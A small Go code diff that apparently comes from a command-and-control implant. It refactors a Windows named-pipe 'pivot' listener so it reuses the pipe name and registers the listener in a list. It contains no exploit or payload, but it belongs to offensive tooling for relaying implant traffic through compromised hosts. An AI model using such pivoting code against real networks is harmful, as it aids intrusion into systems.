@@ -36,13 +36,18 @@ import (
 )
 
 func StartNamedPipeListener(pipeName string) error {
-	ln, err := winio.ListenPipe("\\\\.\\pipe\\"+pipeName, nil)
+	fullName := "\\\\.\\pipe\\"+pipeName
+	ln, err := winio.ListenPipe(fullName, nil)
 	// {{if .Config.Debug}}
-	log.Printf("Listening on %s", "\\\\.\\pipe\\"+pipeName)
+	log.Printf("Listening on %s", fullName)
 	// {{end}}
 	if err != nil {
 		return err
 	}
+	pivotListeners = append(pivotListeners, &PivotListener{
+		Type:          "named-pipe",
+		RemoteAddress: fullName,
+	})
 	go nampedPipeAcceptNewConnection(&ln)
 	return nil
 }
